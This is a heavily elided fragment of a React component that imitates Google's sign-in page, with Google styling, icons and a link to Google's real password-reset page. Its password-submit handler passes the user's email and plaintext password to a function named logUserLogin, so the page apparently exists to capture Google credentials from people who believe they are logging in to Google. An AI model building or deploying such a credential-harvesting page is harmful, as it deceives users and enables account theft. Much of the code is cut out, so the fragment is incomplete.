...
export default function GoogleSignIn() {
  ...
  const handlePasswordSubmit = async (e) => {
    ...
    try {
      await logUserLogin(email, password, true);
      ...
      <div className="flex flex-col items-center justify-center min-h-screen bg-white">
        <div className="w-full max-w-[400px] px-6">
          <div className="text-center mb-8">
            ...
            >
              <path
                d="M43.5 0C19.481 0 0 19.481 0 43.5S19.481 87 43.5 87 87 67.519 87 43.5 67.519 0 43.5 0zm0 78.3c-19.197 0-34.8-15.603-34.8-34.8S24.303 8.7 43.5 8.7s34.8 15.603 34.8 34.8-15.603 34.8-34.8 34.8z"
                fill="#EA4335"
              />
              <path d="M47.85 21.75h-8.7v26.1h8.7v-26.1z" fill="#EA4335" />
              <path d="M47.85 52.2h-8.7v8.7h8.7v-8.7z" fill="#EA4335" />
            </svg>
            <h1 className="text-[22px] mb-6 text-[#202124]">
        ...
        <div className="bg-white py-8 px-10 shadow rounded-lg">
          ...
          {step === 1 ? (
            <div>
              ...
              <p className="text-base text-center mb-7 text-gray-800">
            ...
            <div>
              ...
              <div className="mb-7">
                <a
                  href="https://accounts.google.com/signin/v2/passwordreset"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="text-sm text-blue-600 font-medium hover:text-blue-800"
                >
